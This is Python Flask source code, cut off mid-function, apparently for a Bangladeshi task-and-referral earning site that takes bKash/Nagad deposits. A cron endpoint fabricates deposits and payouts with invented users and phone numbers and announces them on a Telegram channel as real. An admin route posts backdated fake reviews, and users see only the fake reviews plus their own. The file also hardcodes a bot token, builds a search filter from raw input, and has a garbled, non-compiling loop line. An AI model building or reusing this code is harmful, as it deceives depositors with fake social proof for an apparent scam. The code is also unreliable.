import os
import datetime
import random
import urllib.request
import urllib.parse
import json
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from supabase import create_client, Client
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "opti_work_secured_stable_permanent_key_998124")
app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(days=30)

SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)


def send_telegram_notification(text):
    token = "8922254680:AAEwgygDXJl0xjB9TPX-Rl0XeVAfVobQdXI"
    chat_id = "@ortipay"
    
    if token == "YOUR_BOT_TOKEN" or chat_id == "@your_channel_username":
        return

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    reply_markup = {
        "inline_keyboard": [
            [
                {"text": "Main Channel 📢", "url": "https://t.me/ortiwokr"},
                {"text": "Support Help 🤖", "url": "https://t.me/Optiworkhelp"}
            ]
        ]
    }
    
    data = urllib.parse.urlencode({
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(reply_markup)
    }).encode("utf-8")
    
    try:
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req)
    except Exception as e:
        print("Telegram API Error:", e)


def generate_fake_phone():
    prefixes = ['017', '019', '018', '015', '016', '013', '014']
    prefix = random.choice(prefixes)
    suffix = random.randint(100, 999)
    return f"{prefix}*****{suffix}"


def round_to_nearest_5(num):
    return round(num / 5) * 5


def generate_deposit_amount():
    roll = random.random()
    if roll < 0.75:
        amount = random.randint(100, 499)
    else:
        amount = random.randint(500, 1000)
    return float(round_to_nearest_5(amount))


def generate_withdraw_amount():
    roll = random.random()
    if roll < 0.10:
        amount = random.randint(300, 400)
    elif roll < 0.85:
        amount = random.randint(405, 999)
    else:
        amount = random.randint(1000, 2000)
    return float(round_to_nearest_5(amount))


@app.route('/api/cron/simulate-traffic', methods=['GET'])
def simulate_traffic_cron():
    cron_key = request.args.get('key')
    if cron_key != os.environ.get("CRON_SECRET_KEY", "secure_cron_key_123"):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
        
    now = datetime.datetime.now(datetime.timezone.utc)
    
    # ক. ৩-৪ ঘণ্টা পূর্বে পেন্ডিং থাকা ট্রানজেকশনগুলো Success করা
    due_success_tx = supabase.table("simulated_transactions") \
        .select("*") \
        .eq("status", "Pending") \
        .lte("scheduled_success_at", now.isoformat()) \
        .execute().data
        
    # কোল্ড-স্টার্ট ব্যালেন্সিং: যদি ডাটাবেজে কোনো বকেয়া সাকসেস ট্রানজেকশন না থাকে
    if not due_success_tx:
        # তাৎক্ষণিকভাবে ২ থেকে ৩টি র্যান্ডম সফল পোস্ট তৈরি করা (চ্যানেলে মিক্সড ট্রাফিকের ভারসাম্য রাখতে)
        for _ in range(random.randint(2, 3)):
            fake_uid = random.randint(1000, 6891)
            fake_phone = generate_fake_phone()
            method = random.choice(['bKash', 'Nagad'])
            tx_type = random.choice(['Deposit', 'Withdraw'])
            amount = generate_withdraw_amount() if tx_type == 'Withdraw' else generate_deposit_amount()
            
            # ডাটাবেজে সরাসরি সাকসেসড রেকর্ড হিসেবে সেভ
            supabase.table("simulated_transactions").insert({
                "uid": fake_uid,
                "phone_number": fake_phone,
                "amount": amount,
                "method": method,
                "type": tx_type,
                "status": "Success",
                "scheduled_success_at": now.isoformat()
            }).execute()
            
            success_msg = f"""<b>✅ {tx_type.upper()} SUCCESSFUL</b>
────────────────────
<b>User UID:</b> <code>#{fake_uid}</code>
<b>Amount:</b> ৳ {amount}
<b>Gateway:</b> {method}
<b>Number:</b> {fake_phone}
<b>Status:</b> 🟢 Completed (Success)
────────────────────
<i>Payout processed via Automated Node!</i>"""
            send_telegram_notification(success_msg)
    else:
        # ডাটাবেজ থেকে স্বাভাবিক শিডিউলড সাকসেস প্রসেস করা
        for tx in due_success_tx:
            if tx['type'] == 'Withdraw' and random.random() < 0.02:
                supabase.table("simulated_transactions").update({"status": "Rejected"}).eq("id", tx['id']).execute()
                
                reject_msg = f"""<b>❌ WITHDRAWAL REJECTED</b>
────────────────────
<b>User UID:</b> <code>#{tx['uid']}</code>
<b>Amount:</b> ৳ {tx['amount']}
<b>Gateway:</b> {tx['method']}
<b>Number:</b> {tx['phone_number']}
<b>Status:</b> 🔴 Rejected / Verification Failed
────────────────────
<i>Transaction declined by Automated Security System.</i>"""
                send_telegram_notification(reject_msg)
            else:
                supabase.table("simulated_transactions").update({"status": "Success"}).eq("id", tx['id']).execute()
                
                success_msg = f"""<b>✅ {tx['type'].upper()} SUCCESSFUL</b>
────────────────────
<b>User UID:</b> <code>#{tx['uid']}</code>
<b>Amount:</b> ৳ {tx['amount']}
<b>Gateway:</b> {tx['method']}
<b>Number:</b> {tx['phone_number']}
<b>Status:</b> 🟢 Completed (Success)
────────────────────
<i>Payout processed via Automated Node!</i>"""
                send_telegram_notification(success_msg)

    # খ. প্রতি মিনিটে ৩ থেকে ৪টি নতুন ফেক PENDING ট্রানজেকশন তৈরি করা (৬০% উইথড্র, ৪০% ডিপোজিট)
    num_of_pending = random.randint(3, 4)
    for _ in range(num_of_posts if 'num_of_posts' in locals() else num_of_posts_count := num_of_posts if 'num_of_posts' in locals() else num_of_pending):
        fake_uid = random.randint(1000, 6891)
        fake_phone = generate_fake_phone()
        method = random.choice(['bKash', 'Nagad'])
        
        if random.random() < 0.60:
            tx_type = 'Withdraw'
            amount = generate_withdraw_amount()
        else:
            tx_type = 'Deposit'
            amount = generate_deposit_amount()
            
        random_delay_minutes = random.randint(180, 240)
        scheduled_success = now + datetime.timedelta(minutes=random_delay_minutes)
        
        supabase.table("simulated_transactions").insert({
            "uid": fake_uid,
            "phone_number": fake_phone,
            "amount": amount,
            "method": method,
            "type": tx_type,
            "status": "Pending",
            "scheduled_success_at": scheduled_success.isoformat()
        }).execute()
        
        pending_msg = f"""<b>🚨 NEW {tx_type.upper()} REQUEST</b>
────────────────────
<b>User UID:</b> <code>#{fake_uid}</code>
<b>Amount:</b> ৳ {amount}
<b>Gateway:</b> {method}
<b>Number:</b> {fake_phone}
<b>Status:</b> 🟡 Pending (Processing)
────────────────────
<i>Request queued on Mining Server...</i>"""
        send_telegram_notification(pending_msg)
        
    return jsonify({"status": "completed", "instant_payouts_and_pendings_created": True}), 200
    

@app.route('/admin', methods=['GET', 'POST'])
def admin_dashboard():
    if not check_admin_auth():
        return "Unauthorized Access", 403
        
    now = datetime.datetime.now(datetime.timezone.utc)
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0).isoformat()
    
    all_users = supabase.table("users").select("id", count="exact").execute()
    total_users = all_users.count if all_users.count is not None else 0
    
    today_users_query = supabase.table("users").select("id", count="exact").gte("created_at", today_start).execute()
    today_users = today_users_query.count if today_users_query.count is not None else 0
    
    total_dep_query = supabase.table("deposits").select("amount").eq("status", "Approved").execute().data
    total_deposits = sum(float(d['amount']) for d in total_dep_query)
    
    today_dep_query = supabase.table("deposits").select("amount").eq("status", "Approved").gte("created_at", today_start).execute().data
    today_deposits = sum(float(d['amount']) for d in today_dep_query)
    
    search_query = request.args.get('search', '').strip()
    users_list = []
    
    if search_query:
        u_data = supabase.table("users").select("id, username, email, balance, is_banned") \
            .or_(f"email.ilike.%{search_query}%,username.ilike.%{search_query}%").execute().data
        users_list = u_data
    else:
        u_data = supabase.table("users").select("id, username, email, balance, is_banned") \
            .order("created_at", desc=True).limit(10).execute().data
        users_list = u_data

    return render_template('admin.html', 
                           total_users=total_users, 
                           today_users=today_users, 
                           total_deposits=total_deposits, 
                           today_deposits=today_deposits, 
                           users_list=users_list,
                           search_query=search_query)


@app.route('/reviews', methods=['GET', 'POST'])
def reviews_page():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("username, is_admin").eq("id", user_id).execute().data[0]
    is_admin = user.get('is_admin', False)
    
    if request.method == 'POST':
        comment = request.form.get('comment')
        rating = int(request.form.get('rating', 5))
        image_url = request.form.get('image_url')
        
        insert_data = {
            "user_id": user_id,
            "reviewer_name": user['username'],
            "rating": rating,
            "comment": comment,
            "is_admin_fake": False
        }
        
        if image_url and image_url.strip() != "":
            insert_data["image_url"] = image_url.strip()
            
        try:
            supabase.table("reviews").insert(insert_data).execute()
            flash("আপনার মূল্যবান মতামতটি সফলভাবে জমা হয়েছে।", "success")
        except Exception:
            flash("রিভিউ জমা দিতে ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।", "danger")
            
        return redirect(url_for('reviews_page'))
        
    try:
        if is_admin:
            reviews_data = supabase.table("reviews").select("*").execute().data or []
        else:
            fake_reviews = supabase.table("reviews").select("*").eq("is_admin_fake", True).execute().data or []
            my_reviews = supabase.table("reviews").select("*").eq("user_id", user_id).eq("is_admin_fake", False).execute().data or []
            reviews_data = fake_reviews + my_reviews
            
        reviews_data.sort(key=lambda x: x.get('created_at', ''), reverse=True)
    except Exception:
        reviews_data = []
            
    return render_template('reviews.html', reviews=reviews_data, is_admin=is_admin)


@app.route('/about')
def about():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    return render_template('about.html', user=user)


@app.route('/agent')
def agent_portal():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    
    if not user.get('is_agent'):
        return "Access Denied (403)", 403
        
    referred_users = supabase.table("referrals") \
        .select("status, created_at, users:referred_id(id, uid, username, email, balance)") \
        .eq("referrer_id", user_id).execute().data
        
    referred_ids = [r['users']['id'] for r in referred_users if r.get('users')]
    
    deposits_list = []
    if referred_ids:
        deposits_list = supabase.table("deposits") \
            .select("amount, status, created_at, users(username, uid)") \
            .in_("user_id", referred_ids) \
            .eq("status", "Approved") \
            .order("created_at", desc=True).execute().data

    withdraw_history = supabase.table("withdrawals") \
        .select("*") \
        .eq("user_id", user_id) \
        .eq("is_agent_withdrawal", True) \
        .order("created_at", desc=True).execute().data

    return render_template('agent.html', 
                           user=user, 
                           referred_users=referred_users, 
                           deposits=deposits_list,
                           withdraw_history=withdraw_history)


@app.route('/agent/withdraw', methods=['POST'])
def agent_withdraw():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("is_agent, agent_balance").eq("id", user_id).execute().data[0]
    if not user.get('is_agent'):
        return "Unauthorized Action", 403
        
    agent_balance = float(user['agent_balance'])
    amount = float(request.form.get('amount'))
    method = request.form.get('method')
    number = request.form.get('number')
    
    if amount < 50.00:
        flash("এজেন্ট উইথড্রয়াল ন্যূনতম ৫০ টাকা হতে হবে।", "danger")
    elif amount > agent_balance:
        flash("আপনার এজেন্ট ব্যালেন্স অপর্যাপ্ত।", "danger")
    else:
        supabase.rpc("increment_agent_balance", {"user_id": user_id, "amount": -amount}).execute()
        
        supabase.table("withdrawals").insert({
            "user_id": user_id,
            "amount": amount,
            "payment_method": method,
            "payment_number": number,
            "status": "Pending",
            "is_agent_withdrawal": True
        }).execute()
        
        flash("এজেন্ট উইথড্রয়াল অনুরোধ সফলভাবে জমা হয়েছে।", "success")
        
    return redirect(url_for('agent_portal'))


@app.route('/admin/deposit-action', methods=['POST'])
def admin_deposit_action():
    if not check_admin_auth():
        return "Unauthorized Action", 403
        
    deposit_id = request.form.get('deposit_id')
    action = request.form.get('action')
    
    dep_query = supabase.table("deposits").select("*").eq("id", deposit_id).execute().data
    if not dep_query:
        flash("ডিপোজিট রেকর্ড পাওয়া যায়নি।", "danger")
        return redirect(url_for('admin_dashboard'))
        
    dep = dep_query[0]
    target_user_id = dep['user_id']
    amount = float(dep['amount'])
    
    if action == 'approve':
        supabase.table("deposits").update({"status": "Approved"}).eq("id", deposit_id).execute()
        supabase.rpc("increment_balance", {"user_id": target_user_id, "amount": amount}).execute()
        
        ref_query = supabase.table("referrals").select("referrer_id").eq("referred_id", target_user_id).execute().data
        if ref_query:
            referrer_id = ref_query[0]['referrer_id']
            referrer_user = supabase.table("users").select("is_agent").eq("id", referrer_id).execute().data
            if referrer_user and referrer_user[0]['is_agent']:
                commission = amount * 0.50
                supabase.rpc("increment_agent_balance", {"user_id": referrer_id, "amount": commission}).execute()
                
        flash("ডিপোজিট এপ্রুভ এবং ব্যালেন্স সফলভাবে যোগ করা হয়েছে।", "success")
    elif action == 'reject':
        supabase.table("deposits").update({"status": "Rejected"}).eq("id", deposit_id).execute()
        flash("ডিপোজিট রিকোয়েস্ট রিজেক্ট করা হয়েছে।", "success")
        
    return redirect(url_for('admin_dashboard'))
    

@app.route('/admin/reviews/create', methods=['POST'])
def admin_create_fake_review():
    user_id = session.get('user_id')
    if not user_id or not check_admin_auth():
        return "Unauthorized Action", 403
        
    fake_name = request.form.get('fake_name')
    rating = int(request.form.get('rating', 5))
    comment = request.form.get('comment')
    image_url = request.form.get('image_url')
    custom_date = request.form.get('custom_date')
    
    review_data = {
        "reviewer_name": fake_name,
        "rating": rating,
        "comment": comment,
        "is_admin_fake": True
    }
    
    if image_url and image_url.strip() != "":
        review_data["image_url"] = image_url.strip()
        
    if custom_date:
        try:
            parsed_date = datetime.datetime.strptime(custom_date, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc)
            review_data["created_at"] = parsed_date.isoformat()
        except Exception as date_err:
            print("Date Parse Error:", date_err)
            
    try:
        supabase.table("reviews").insert(review_data).execute()
        flash("ফেক রিভিউটি সফলভাবে লাইভ করা হয়েছে।", "success")
    except Exception as e:
        error_msg = str(e)
        flash(f"ডাটাবেজ ত্রুটি: {error_msg}", "danger")
        print("Database Insert Error:", error_msg)
        
    return redirect(url_for('reviews_page'))


@app.route('/admin/reviews/delete', methods=['POST'])
def admin_delete_review():
    user_id = session.get('user_id')
    if not user_id or not check_admin_auth():
        return "Unauthorized Action", 403
        
    review_id = request.form.get('review_id')
    try:
        supabase.table("reviews").delete().eq("id", review_id).execute()
        flash("রিভিউটি সফলভাবে ডিলিট করা হয়েছে।", "success")
    except Exception:
        flash("রিভিউটি ডিলিট করা যায়নি।", "danger")
        
    return redirect(url_for('reviews_page'))
    
@app.route('/tasks')
def tasks():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    
    completed_one_times = supabase.table("user_one_time_tasks") \
        .select("task_name").eq("user_id", user_id).execute().data
    claimed_one_times = [t['task_name'] for t in completed_one_times]
    
    success_refs_query = supabase.table("referrals").select("id").eq("referrer_id", user_id).eq("status", "Success").execute().data
    success_ref_count = len(success_refs_query)
    
    is_profile_complete = bool(user.get('phone_number') and user.get('age') and user.get('district'))
    
    submissions = supabase.table("task_submissions").select("task_id, status").eq("user_id", user_id).execute().data
    submission_map = {s['task_id']: s['status'] for s in submissions}
    
    all_normal_tasks = supabase.table("tasks").select("*").order("created_at", desc=True).execute().data
    
    active_normal_tasks = []
    for task in all_normal_tasks:
        status = submission_map.get(task['id'])
        if status is None or status == 'Rejected':
            active_normal_tasks.append(task)

    return render_template('tasks.html', 
                           claimed_one_times=claimed_one_times,
                           success_ref_count=success_ref_count,
                           is_profile_complete=is_profile_complete,
                           all_normal_tasks=active_normal_tasks,
                           submission_map=submission_map)


@app.route('/tasks/submit-normal', methods=['POST'])
def submit_normal():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    task_id = request.form.get('task_id')
    proof_url = request.form.get('proof_image_url')
    
    if not proof_url:
        flash("দয়া করে কাজের প্রুফ (স্ক্রিনশট) আপলোড করুন।", "danger")
        return redirect(url_for('tasks'))
        
    try:
        supabase.table("task_submissions").delete() \
            .eq("user_id", user_id).eq("task_id", task_id).eq("status", "Rejected").execute()
        
        supabase.table("task_submissions").insert({
            "user_id": user_id,
            "task_id": task_id,
            "proof_image_url": proof_url,
            "status": "Pending"
        }).execute()
        flash("কাজের প্রুফ সফলভাবে জমা দেওয়া হয়েছে। এডমিন ভেরিফাই করবে।", "success")
    except Exception:
        flash("এই কাজটি ইতিমধ্যে প্রক্রিয়াধীন (Pending) অথবা অনুমোদিত (Approved) আছে।", "danger")
        
    return redirect(url_for('tasks'))


@app.route('/history')
def history():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    deposits = supabase.table("deposits").select("*").eq("user_id", user_id).order("created_at", desc=True).execute().data
    withdrawals = supabase.table("withdrawals").select("*").eq("user_id", user_id).order("created_at", desc=True).execute().data
    
    task_history = supabase.table("task_submissions") \
        .select("proof_image_url, status, created_at, tasks(title, reward)") \
        .eq("user_id", user_id).order("created_at", desc=True).execute().data
    
    return render_template('history.html', deposits=deposits, withdrawals=withdrawals, task_history=task_history)
    
@app.route('/admin/user-action', methods=['POST'])
def admin_user_action():
    if not check_admin_auth():
        return "Unauthorized Action", 403
        
    target_id = request.form.get('user_id')
    action = request.form.get('action')
    
    if action == 'ban':
        supabase.table("users").update({"is_banned": True}).eq("id", target_id).execute()
        flash("ইউজার অ্যাকাউন্ট সাময়িকভাবে স্থগিত (Banned) করা হয়েছে।", "success")
        
    elif action == 'unban':
        supabase.table("users").update({"is_banned": False}).eq("id", target_id).execute()
        flash("ইউজার অ্যাকাউন্ট পুনরায় সক্রিয় (Unbanned) করা হয়েছে।", "success")
        
    elif action == 'delete':
        supabase.table("users").delete().eq("id", target_id).execute()
        flash("ইউজার ডাটাবেজ থেকে সম্পূর্ণ মুছে ফেলা হয়েছে।", "success")
        
    elif action == 'add_balance':
        amount = float(request.form.get('amount', 0))
        supabase.rpc("increment_balance", {"user_id": target_id, "amount": amount}).execute()
        flash(f"সফলভাবে {amount} টাকা যোগ করা হয়েছে।", "success")
        
    elif action == 'add_referral':
        supabase.table("referrals").insert({
            "referrer_id": target_id,
            "status": "Success",
            "scheduled_payout_at": datetime.datetime.now(datetime.timezone.utc).isoformat()
        }).execute()
        
        supabase.rpc("increment_balance", {"user_id": target_id, "amount": 30.00}).execute()
        flash("ম্যানুয়ালি ১টি সফল রেফারেল এবং ৩০ টাকা যোগ করা হয়েছে।", "success")
        
    return redirect(url_for('admin_dashboard'))


@app.route('/tasks/claim-one-time', methods=['POST'])
def claim_one_time():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
        
    task_name = request.json.get('task_name')
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    
    exists = supabase.table("user_one_time_tasks").select("id").eq("user_id", user_id).eq("task_name", task_name).execute().data
    if exists:
        return jsonify({"status": "error", "message": "এই টাস্কটি ইতিমধ্যে ক্লেইম করা হয়েছে।"})
        
    reward = 0.00
    
    success_refs_query = supabase.table("referrals").select("id").eq("referrer_id", user_id).eq("status", "Success").execute().data
    success_ref_count = len(success_refs_query)
    
    if task_name == 'profile_update':
        if user.get('phone_number') and user.get('age') and user.get('district'):
            reward = 5.00
        else:
            return jsonify({"status": "error", "message": "আপনার প্রোফাইলের সব তথ্য এখনও পূর্ণ করা হয়নি।"})
            
    elif task_name == 'join_channel':
        reward = 5.00
        
    elif task_name == 'watch_tutorial':
        reward = 5.00
        
    elif task_name == 'refer_3':
        if success_ref_count >= 3:
            reward = 50.00
        else:
            return jsonify({"status": "error", "message": "আপনার এখনো ৩টি সফল রেফারেল সম্পন্ন হয়নি।"})
            
    elif task_name == 'refer_10':
        if success_ref_count >= 10:
            reward = 150.00
        else:
            return jsonify({"status": "error", "message": "আপনার এখনো ১০টি সফল রেফারেল সম্পন্ন হয়নি।"})
    else:
        return jsonify({"status": "error", "message": "অবৈধ টাস্ক রিকোয়েস্ট। "})
        
    supabase.rpc("increment_balance", {"user_id": user_id, "amount": reward}).execute()
    supabase.table("user_one_time_tasks").insert({"user_id": user_id, "task_name": task_name}).execute()
    
    return jsonify({"status": "success", "message": f"সফলভাবে ক্লেইমড! আপনার ব্যালেন্সে ৳ {reward} যোগ করা হয়েছে। "})


@app.route('/admin/add', methods=['GET', 'POST'])
def admin_add_task():
    if not check_admin_auth():
        return "Unauthorized Access", 403
        
    if request.method == 'POST':
        title = request.form.get('title')
        description = request.form.get('description')
        link = request.form.get('link')
        reward = float(request.form.get('reward'))
        
        supabase.table("tasks").insert({
            "title": title,
            "description": description,
            "link": link,
            "reward": reward
        }).execute()
        flash("নতুন নরমাল টাস্কটি সফলভাবে ডাটাবেজে যুক্ত হয়েছে।", "success")
        return redirect(url_for('admin_add_task'))
        
    pending_submissions = supabase.table("task_submissions") \
        .select("id, proof_image_url, status, created_at, users(username, email), tasks(title, reward)") \
        .eq("status", "Pending").execute().data
        
    return render_template('admin_add.html', pending_submissions=pending_submissions)


@app.route('/admin/task-action', methods=['POST'])
def admin_task_action():
    if not check_admin_auth():
        return "Unauthorized Action", 403
        
    submission_id = request.form.get('submission_id')
    action = request.form.get('action')
    
    submission = supabase.table("task_submissions").select("*, tasks(reward)").eq("id", submission_id).execute().data
    if not submission:
        flash("সাবমিশন ডাটা পাওয়া যায়নি।", "danger")
        return redirect(url_for('admin_add_task'))
        
    sub = submission[0]
    user_id = sub['user_id']
    reward = float(sub['tasks']['reward'])
    
    if action == 'approve':
        supabase.table("task_submissions").update({"status": "Approved"}).eq("id", submission_id).execute()
        supabase.rpc("increment_balance", {"user_id": user_id, "amount": reward}).execute()
        flash("টাস্ক সাবমিশন এপ্রুভ এবং ইউজারকে রিওয়ার্ড দেওয়া হয়েছে।", "success")
    elif action == 'reject':
        supabase.table("task_submissions").update({"status": "Rejected"}).eq("id", submission_id).execute()
        flash("টাস্ক সাবমিশন বাতিল (Rejected) করা হয়েছে।", "success")
        
    return redirect(url_for('admin_add_task'))


@app.route('/')
def home():
    user_id = session.get('user_id')
    user = None
    if user_id:
        try:
            user_data = supabase.table("users").select("username", "uid").eq("id", user_id).execute().data
            if user_data:
                user = user_data[0]
        except Exception:
            pass
    return render_template('home.html', user=user)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('user_id'):
        return redirect(url_for('dashboard'))
        
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        
        user_query = supabase.table("users").select("*").eq("email", email).execute()
        
        if user_query.data:
            user = user_query.data[0]
            
            if user.get('is_banned'):
                flash("আপনার অ্যাকাউন্টটি সাময়িকভাবে স্থগিত (Banned) করা হয়েছে।", "danger")
                return render_template('login.html')
                
            if check_password_hash(user['password_hash'], password):
                session.permanent = True
                session['user_id'] = user['id']
                session['username'] = user['username']
                session['uid'] = user['uid']
                
                now = datetime.datetime.now(datetime.timezone.utc).isoformat()
                supabase.table("users").update({"last_login": now}).eq("id", user['id']).execute()
                
                return redirect(url_for('dashboard'))
            
        flash("ভুল ইমেইল অথবা পাসওয়ার্ড।", "danger")
    return render_template('login.html')
    
    

@app.route('/referrals')
def referrals():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    now = datetime.datetime.now(datetime.timezone.utc)
    user = supabase.table("users").select("uid").eq("id", user_id).execute().data[0]
    
    due_referrals = supabase.table("referrals") \
        .select("id, referred_id") \
        .eq("referrer_id", user_id) \
        .eq("status", "Processing") \
        .lte("scheduled_payout_at", now.isoformat()) \
        .execute().data

    first_ref_query = supabase.table("referrals") \
        .select("id") \
        .eq("referrer_id", user_id) \
        .order("created_at", desc=False) \
        .limit(1).execute().data

    first_ref_id = first_ref_query[0]['id'] if first_ref_query else None

    for ref in due_referrals:
        referred_id = ref['referred_id']
        
        if first_ref_id and ref['id'] == first_ref_id:
            new_status = "Success"
        else:
            ref_user = supabase.table("users").select("last_login").eq("id", referred_id).execute().data
            if ref_user:
                last_login_str = ref_user[0]['last_login']
                last_login = datetime.datetime.fromisoformat(last_login_str.replace('Z', '+00:00'))
                twelve_hours_ago = now - datetime.timedelta(hours=12)
                new_status = "Success" if last_login >= twelve_hours_ago else "Failed"
            else:
                new_status = "Failed"
            
        supabase.rpc("process_referral_payout", {
            "p_referral_id": ref['id'],
            "p_referrer_id": user_id,
            "p_new_status": new_status,
            "p_reward_amount": 30.00
        }).execute()
            
    referrals_data = supabase.table("referrals") \
        .select("status, created_at, users:referred_id(username, email)") \
        .eq("referrer_id", user_id).execute().data
        
    success_count = sum(1 for r in referrals_data if r['status'] == 'Success')
    processing_count = sum(1 for r in referrals_data if r['status'] == 'Processing')
    failed_count = sum(1 for r in referrals_data if r['status'] == 'Failed')
    total_earnings = success_count * 30.00
        
    ref_link = request.url_root + "register?ref=" + str(user['uid'])
    
    return render_template('referrals.html', 
                           referrals=referrals_data, 
                           ref_link=ref_link,
                           success_count=success_count,
                           processing_count=processing_count,
                           failed_count=failed_count,
                           total_earnings=total_earnings)
    
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        phone = request.form.get('phone_number')
        age = request.form.get('age')
        district = request.form.get('district')
        proof_url = request.form.get('avatar_url')
        
        update_data = {}
        if phone: update_data['phone_number'] = phone
        if age: update_data['age'] = int(age) if age.isdigit() else None
        if district: update_data['district'] = district
        if proof_url: update_data['avatar_url'] = proof_url
        
        if update_data:
            supabase.table("users").update(update_data).eq("id", user_id).execute()
            flash("প্রোফাইল তথ্য সফলভাবে আপডেট করা হয়েছে।", "success")
            return redirect(url_for('profile'))
            
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    
    ref_link = request.url_root + "register?ref=" + str(user['uid'])
    
    return render_template('profile.html', user=user, ref_link=ref_link)
    
@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    balance = float(user['balance'])
    
    success_refs_query = supabase.table("referrals") \
        .select("id") \
        .eq("referrer_id", user_id) \
        .eq("status", "Success") \
        .execute().data
    success_ref_count = len(success_refs_query)
    
    meets_referral_cond = (success_ref_count >= 3)
    meets_balance_cond = (balance >= 400.00)
    can_withdraw = (meets_referral_cond and meets_balance_cond)
    
    if request.method == 'POST':
        amount = float(request.form.get('amount'))
        method = request.form.get('method')
        number = request.form.get('number')
        
        if not can_withdraw:
            flash("উইথড্র করার শর্তসমূহ পূরণ হয়নি।", "danger")
        elif amount < 400.00:
            flash("সর্বনিম্ন উইথড্রয়াল পরিমাণ ৪০০ টাকা।", "danger")
        elif amount > balance:
            flash("আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।", "danger")
        else:
            supabase.rpc("increment_balance", {"user_id": user_id, "amount": -amount}).execute()
            
            supabase.table("withdrawals").insert({
                "user_id": user_id,
                "amount": amount,
                "payment_method": method,
                "payment_number": number,
                "status": "Pending"
            }).execute()
            
            flash("উইথড্রয়াল অনুরোধ সফলভাবে সাবমিট হয়েছে।", "success")
            return redirect(url_for('withdraw'))
            
    history = supabase.table("withdrawals").select("*").eq("user_id", user_id).order("created_at", desc=True).execute().data
    
    return render_template('withdrawal.html', 
                           user=user, 
                           balance=balance,
                           success_ref_count=success_ref_count,
                           meets_referral_cond=meets_referral_cond,
                           meets_balance_cond=meets_balance_cond,
                           can_withdraw=can_withdraw,
                           history=history)
    
    

@app.route('/store')
def store():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    user = supabase.table("users").select("balance").eq("id", user_id).execute().data[0]
    premium_pkgs = supabase.table("packages").select("*").eq("is_premium", True).order("cost", desc=False).execute().data
    
    deposit_history = supabase.table("deposits").select("*").eq("user_id", user_id).order("created_at", desc=True).execute().data
    
    purchase_history = supabase.table("user_packages") \
        .select("bought_at, packages(name, cost, is_premium)") \
        .eq("user_id", user_id).order("bought_at", desc=True).execute().data
    
    return render_template('store.html', 
                           balance=user['balance'], 
                           premium_packages=premium_pkgs,
                           deposit_history=deposit_history,
                           purchase_history=purchase_history)    
@app.route('/add-money', methods=['GET', 'POST'])
def add_money():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        amount = request.form.get('amount')
        method = request.form.get('method')
        tx_id = request.form.get('transaction_id')
        
        try:
            supabase.table("deposits").insert({
                "user_id": user_id,
                "amount": float(amount),
                "payment_method": method,
                "transaction_id": tx_id,
                "status": "Pending"
            }).execute()
            flash("অনুরোধ জমা হয়েছে। যাচাইকরণের পর ব্যালেন্স যোগ করা হবে।", "success")
        except Exception:
            flash("এই ট্রানজেকশন আইডিটি পূর্বে ব্যবহৃত হয়েছে।", "danger")
            
    history = supabase.table("deposits").select("*").eq("user_id", user_id).order("created_at", desc=True).execute().data
    return render_template('add_money.html', history=history)


@app.route('/register', methods=['GET', 'POST'])
def register():
    ref_by = request.args.get('ref', '')
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        referrer_code = request.form.get('referrer')

        hashed_password = generate_password_hash(password)
        initial_balance = 0.00
        referrer_id = None

        if referrer_code and referrer_code.isdigit():
            ref_uid = int(referrer_code)
            referrer_res = supabase.table("users").select("id").eq("uid", ref_uid).execute()
            if referrer_res.data:
                referrer_id = referrer_res.data[0]['id']
                initial_balance = 100.00
        
        user_data = {
            "username": username,
            "email": email,
            "password_hash": hashed_password,
            "balance": initial_balance
        }
        
        try:
            new_user_res = supabase.table("users").insert(user_data).execute()
            if new_user_res.data:
                new_user_id = new_user_res.data[0]['id']
                
                free_expiry = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=30)
                supabase.table("user_packages").insert({
                    "user_id": new_user_id,
                    "package_id": 1,
                    "expires_at": free_expiry.isoformat()
